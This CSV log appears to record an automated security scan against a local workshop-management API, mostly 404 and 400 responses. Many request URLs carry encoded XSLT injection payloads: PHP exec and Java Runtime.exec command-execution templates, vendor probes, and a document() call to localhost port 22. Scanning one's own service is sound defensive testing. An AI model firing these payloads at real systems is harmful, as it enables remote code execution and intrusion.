ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
8897,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,DELETE,https://localhost:7194/api/veiculos/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,167,99,0
8898,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3C,404,Not Found,328,99,0
8899,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,POST,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E/enviar-orcamento,404,Not Found,182,99,0
8900,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,GET,https://localhost:7194/api/clientes/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,67,99,0
8901,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,422,150,197
8902,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,PUT,https://localhost:7194/api/insumos,400,Bad Request,557,150,197
8903,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,GET,https://localhost:7194/api/insumos/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,102,99,0
8904,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:08 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,142,99,0
8905,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/insumos/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,67,99,0
8906,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/insumos/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,16,99,0
8907,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3C/acompanhamento,404,Not Found,505,99,0
8908,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,35,99,0
8909,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3C,404,Not Found,516,99,0
8910,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/veiculos,400,Bad Request,667,150,197
8911,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E/acompanhamento,404,Not Found,122,99,0
8912,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/insumos/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,150,99,0
8913,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,150,99,0
8914,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/clientes,400,Bad Request,674,150,197
8915,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3C,404,Not Found,661,99,0
8916,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,POST,https://localhost:7194/api/servicos,400,Bad Request,749,150,220
8917,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/system-property%28%27xsl%3Avendor%27%29%2F%3E/acompanhamento,404,Not Found,43,99,0
8918,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,170,99,0
8919,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/insumos,400,Bad Request,264,150,197
8920,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/insumos/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,32,99,0
8921,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,32,99,0
8922,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,26,99,0
8923,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3C,404,Not Found,694,99,0
8924,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,15,99,0
8925,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--/acompanhamento,404,Not Found,32,99,0
8926,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,16,99,0
8927,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,15,99,0
8928,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos,200,OK,703,142,5536
8929,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,360,150,197
8930,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,15,99,0
8931,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,7,99,0
8932,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,6,99,0
8933,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--/acompanhamento,404,Not Found,7,99,0
8934,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,12,99,0
8935,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,44,99,0
8936,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,95,99,0
8937,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,134,99,0
8938,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E/acompanhamento,404,Not Found,139,99,0
8939,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,109,99,0
8940,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,161,99,0
8941,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/veiculos,400,Bad Request,395,150,197
8942,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,100,99,0
8943,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E/acompanhamento,404,Not Found,136,99,0
8944,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,114,99,0
8945,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,184,99,0
8946,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,POST,https://localhost:7194/api/clientes,400,Bad Request,911,149,74
8947,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/servicos,400,Bad Request,1075,150,197
8948,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,88,99,0
8949,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E/acompanhamento,404,Not Found,136,99,0
8950,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,POST,https://localhost:7194/api/insumos,201,Created,974,229,189
8951,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,417,150,197
8952,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,147,99,0
8953,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,158,99,0
8954,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,60,99,0
8955,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:09 GMT-03:00 2026,POST,https://localhost:7194/api/ordens-servico,400,Bad Request,1025,150,204
8956,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,369,99,0
8957,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/clientes,400,Bad Request,828,150,197
8958,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/servicos,400,Bad Request,819,150,220
8959,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/swagger,404,Not Found,786,99,0
8960,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/insumos,400,Bad Request,802,150,197
8961,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/servicos/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,285,99,0
8962,Tue Jun 09 11:38:08 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/veiculos,400,Bad Request,1213,150,205
8963,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,369,150,197
8964,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/veiculos,400,Bad Request,581,150,197
8965,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3C,404,Not Found,789,99,0
8966,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/insumos,201,Created,417,229,185
8967,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/ordens-servico/cliente/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,468,99,0
8968,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos?clienteId=%3C,400,Bad Request,1058,149,82
8969,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/servicos,400,Bad Request,286,150,220
8970,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/clientes,400,Bad Request,286,150,197
8971,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/veiculos,400,Bad Request,312,150,205
8972,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/clientes,400,Bad Request,836,149,74
8973,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/insumos,400,Bad Request,376,150,197
8974,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,397,99,0
8975,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/ordens-servico,400,Bad Request,775,150,204
8976,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,155,99,0
8977,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos?clienteId=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,400,Bad Request,285,150,192
8978,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,554,150,198
8979,Tue Jun 09 11:38:09 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/servicos,400,Bad Request,967,150,197
8980,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,51,99,0
8981,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/insumos,201,Created,560,229,183
8982,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/veiculos,400,Bad Request,608,150,197
8983,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,86,99,0
8984,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,104,99,0
8985,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,POST,https://localhost:7194/api/servicos,400,Bad Request,585,150,220
8986,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,PUT,https://localhost:7194/api/clientes,400,Bad Request,586,150,197
8987,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:10 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,91,99,0
8988,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos?clienteId=system-property%28%27xsl%3Avendor%27%29%2F%3E,400,Bad Request,454,150,142
8989,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,132,99,0
8990,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/insumos,400,Bad Request,440,150,130
8991,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/ordens-servico,400,Bad Request,625,150,204
8992,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/veiculos,400,Bad Request,871,150,205
8993,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/servicos,400,Bad Request,628,150,197
8994,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/clientes,400,Bad Request,822,149,74
8995,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/insumos,400,Bad Request,840,150,198
8996,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,695,150,197
8997,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/veiculos,400,Bad Request,728,150,197
8998,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/servicos,400,Bad Request,511,150,220
8999,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/insumos,201,Created,354,229,201
9000,Tue Jun 09 11:38:10 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/clientes,400,Bad Request,537,150,198
9001,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,GET,https://localhost:7194/api/veiculos?clienteId=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,400,Bad Request,531,150,208
9002,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/clientes,400,Bad Request,494,149,74
9003,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/servicos,400,Bad Request,510,150,197
9004,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,POST,https://localhost:7194/api/ordens-servico,400,Bad Request,625,150,205
9005,Tue Jun 09 11:38:11 GMT-03:00 2026,Tue Jun 09 11:38:11 GMT-03:00 2026,PUT,https://localhost:7194/api/ordens-servico,400,Bad Request,650,150,197
